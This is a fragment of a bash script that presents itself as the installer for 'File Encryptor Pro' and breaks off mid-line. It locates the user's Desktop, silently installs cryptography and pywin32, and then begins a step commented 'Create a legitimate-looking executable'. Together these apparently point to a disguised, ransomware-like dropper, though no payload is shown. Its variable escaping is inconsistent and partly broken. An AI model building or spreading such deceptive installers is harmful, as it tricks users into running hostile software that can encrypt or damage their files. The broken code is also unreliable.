#!/bin/bash

# File Encryptor Pro - Installation Script
echo "Installing File Encryptor Pro..."
echo "This may take a few minutes..."

# Check if running on Windows (via Git Bash, WSL, or similar)
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" || "\$OSTYPE" == "cygwin" ]]; then
    echo "Detected Windows environment"
    DESKTOP_PATH=\$(cmd.exe /c 'echo %USERPROFILE%\Desktop' | tr -d '\r')
elif [[ "\$OSTYPE" == "darwin"* ]]; then
    echo "Detected macOS environment"
    DESKTOP_PATH="\$HOME/Desktop"
else
    echo "Detected Linux environment"
    DESKTOP_PATH="\$HOME/Desktop"
fi

# Install required Python packages
echo "Installing dependencies..."
pip install cryptography pywin32 > /dev/null 2>&1

# Create a legitimate-looking executable
echo "Creating File Encryptor Pro shortcut..."
if [[ "\$OSTYPE" ==
